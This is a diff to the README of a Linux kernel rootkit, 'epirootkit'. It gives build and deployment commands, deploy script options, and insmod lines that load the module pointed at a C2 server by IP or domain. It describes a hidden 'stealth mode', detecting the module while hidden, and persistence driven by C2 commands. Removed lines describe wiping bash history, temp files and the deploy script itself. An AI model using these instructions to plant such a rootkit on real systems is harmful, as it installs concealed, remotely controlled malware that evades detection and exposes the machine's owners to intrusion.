@@ -26,6 +26,13 @@ sudo apt install -y build-essential linux-headers-$(uname -r)
 
 ## Build
 
+### Using Deploy Script (Recommended)
+```bash
+# Build rootkit using main deployment script
+./deploy_c2.sh --rootkit
+```
+
+### Manual Build
 ```bash
 cd rootkit
 make clean && make
@@ -37,42 +44,45 @@ make clean && make
 ### Deployment Script
 
 ```bash
-# Default usage (uses ./epirootkit.ko automatically)
+# Basic deployment (uses ./epirootkit.ko automatically)
+cd rootkit
 sudo ./deploy_rootkit.sh
 
 # Custom C2 server
-sudo ./deploy_rootkit.sh ./epirootkit.ko address=192.168.200.11 port=4444
+sudo ./deploy_rootkit.sh -a 192.168.200.11 -p 4444
 
-# Domain-based deployment
-sudo ./deploy_rootkit.sh address=jules_chef_de_majeur.epirootkit.com
+# Domain-based deployment  
+sudo ./deploy_rootkit.sh -a c2.example.com
 
-# Stealth deployment with self-cleanup
-sudo ./deploy_rootkit.sh --self-delete
-
-# Verbose deployment (show output)
-sudo ./deploy_rootkit.sh --verbose
+# Custom module file
+sudo ./deploy_rootkit.sh -m /path/to/epirootkit.ko
 ```
+
+### Deployment Commands
+| Command | Description |
+|---------|-------------|
+| `deploy` | Install and load module (default) |
+| `status` | Check current module status |
+| `uninstall` | Remove module completely |
+| `help` | Show detailed help |
 
 ### Deployment Options
 | Option | Description |
 |--------|-------------|
-| `--verbose` | Show detailed output during deployment |
-| `--self-delete` | Remove script after successful deployment |
-| `status` | Check current deployment status |
-| `uninstall` | Remove module and cleanup |
+| `-m, --module FILE` | Specify module file (default: ./epirootkit.ko) |
+| `-a, --address ADDR` | C2 server address (default: 192.168.200.11) |
+| `-p, --port PORT` | C2 server port (default: 4444) |
+| `-h, --help` | Show help message |
 
 ### Advanced Usage
 ```bash
-# Stealth deployment
-sudo ./deploy_rootkit.sh address=c2.example.com port=443 --self-delete
-
-# Deploy with verbose output then self-destruct
-sudo ./deploy_rootkit.sh --verbose --self-delete
+# Custom deployment with domain
+sudo ./deploy_rootkit.sh -a c2.example.com -p 443
 
 # Check deployment status
 sudo ./deploy_rootkit.sh status
-# Status: Active (hidden)
-# Note: Persistence is managed internally by the rootkit
+# Module is loaded and visible
+# OR: Module is loaded and hidden (stealth mode active)
 
 # Remove deployment
 sudo ./deploy_rootkit.sh uninstall
@@ -81,54 +91,48 @@ sudo ./deploy_rootkit.sh uninstall
 
 ### Manual Loading (Alternative)
 ```bash
-# Load with domain
-sudo insmod epirootkit.ko address=jules-c2.example.com
+# Load with domain  
+sudo insmod epirootkit.ko address=c2.example.com
 
-# Load with IP
+# Load with IP and port
 sudo insmod epirootkit.ko address=192.168.200.11 port=4444
 
-# Load with defaults from config.h
+# Load with defaults from config
 sudo insmod epirootkit.ko
 ```
 
-## Self-Cleanup Features
+## Module Status Detection
 
-The deployment script includes stealth capabilities:
+The deployment script can detect module status even when hidden:
 
-### Trace Cleanup
-- **Temp files**: Removes all `/tmp/jules_est_bo_*` files
-- **History cleanup**: Removes deployment commands from bash history
-- **Stealth backup**: Creates and removes backup module files
-
-### Self-Destruction
-```bash
-# Deploy and vanish completely
-sudo ./deploy_rootkit.sh --self-delete
-# Deployment successful
-# Self-deleting deployment script...
-# (script file removed automatically)
-```
+### Status Checking
+- **Visible module**: Detected via `lsmod` output
+- **Hidden module**: Detected via sysfs interface `/sys/kernel/epirootkit/control`
+- **Not loaded**: No traces found in either location
 
 ## Management
 
 ### Check Status
 ```bash
+cd rootkit
 sudo ./deploy_rootkit.sh status
-# Status: Active (hidden)
-# Note: Persistence is managed internally by the rootkit
+# Module is loaded and visible
+# OR: Module is loaded and hidden (stealth mode active)
 ```
 
 ### Default Behavior
-- **Module file**: Uses `./epirootkit.ko` by default if no file specified
-- **C2 address**: Uses `192.168.200.11:4444` by default
-- **Stealth mode**: Silent operation by default (use `--verbose` for output)
-- **Persistence**: Automatically handled by rootkit internal mechanisms
+- **Module file**: Uses `./epirootkit.ko` by default
+- **C2 address**: Uses `192.168.200.11:4444` by default  
+- **Installation**: Module copied to `/lib/modules/$(uname -r)/extra/`
+- **Persistence**: Managed through C2 commands after connection
 
 ### Complete Removal
 ```bash
+cd rootkit
 sudo ./deploy_rootkit.sh uninstall
+# Module removed from memory
+# Module removed from system
 # Module uninstalled
-# Note: Rootkit persistence may remain - use rootkit's own removal commands
 ```
 
 **Domain Support**: The rootkit supports both domain names and IP addresses. For DNS resolution details, see [DNS Resolution](./features/dns-resolution.md).
